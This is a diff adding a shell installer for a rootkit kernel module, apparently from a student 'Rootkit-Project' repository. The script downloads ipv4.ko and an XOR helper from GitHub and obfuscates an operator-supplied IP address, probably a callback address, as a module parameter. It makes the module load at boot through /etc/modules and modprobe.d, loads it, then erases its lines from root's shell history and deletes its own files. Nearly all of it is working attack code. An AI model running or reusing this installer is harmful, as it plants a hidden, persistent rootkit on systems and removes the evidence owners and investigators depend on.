@@ -1,0 +1,35 @@
+#!/bin/ash
+
+# récuperer le .ko
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/ipv4.ko
+
+# ajout de ip personnalisé
+echo "Tape ton ip:"
+read IP_ADDR
+if [ -z "$IP_ADDR" ]; then
+  echo "ip adresse vide."
+  exit 1
+fi
+
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor.c
+gcc -o xor xor.c
+encrypted=$(./xor $IP_ADDR)
+# echo "ip chiffrée: $encrypted"
+
+# persistence (load le module au demarage)
+echo "ipv4" >> /etc/modules
+mkdir -p /lib/modules/$(uname -r)/extra
+echo "options ipv4 param=$encrypted" > /etc/modprobe.d/ipv4.conf
+cp ipv4.ko /lib/modules/$(uname -r)/extra/
+depmod -a 2>/dev/null
+
+# load le module
+modprobe ipv4
+
+# supprimer les traces
+rm ipv4.ko
+sed -i '/ipv4/d' /root/.ash_history
+sed -i '/insertion/d' /root/.ash_history
+rm insertion_script
+rm xor
+rm xor.c
